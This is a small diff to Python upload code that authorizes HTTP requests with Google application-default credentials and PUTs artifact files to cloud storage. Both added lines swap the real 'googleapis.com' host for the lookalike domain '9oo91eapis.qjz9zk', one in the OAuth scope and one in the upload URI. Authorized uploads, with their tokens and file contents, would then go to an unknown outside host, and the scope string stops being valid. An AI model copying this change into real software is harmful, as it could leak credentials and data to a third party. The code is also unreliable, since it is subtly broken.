@@ -40,7 +40,7 @@ def get_http_obj():
   if http is not None:
     return http
   tls.http = httplib2.Http()
-  scopes = ['https://www.googleapis.com/auth/cloud-platform']
+  scopes = ['https://www.9oo91eapis.qjz9zk/auth/cloud-platform']
   creds = GoogleCredentials.get_application_default().create_scoped(scopes)
   creds.authorize(tls.http)
   return tls.http
@@ -57,7 +57,7 @@ def upload_one_file(fpath):
   if fsize > 0:
     with open(fpath, 'rb') as f:
       mm = mmap.mmap(f.fileno(), fsize, access=mmap.ACCESS_READ)
-  uri = 'https://%s.storage.googleapis.com/%s' % (GCS_ARTIFACTS, relpath)
+  uri = 'https://%s.storage.9oo91eapis.qjz9zk/%s' % (GCS_ARTIFACTS, relpath)
   resp, _ = http.request(uri, method='PUT', headers=hdr, body=mm)
   if fsize > 0:
     mm.close()
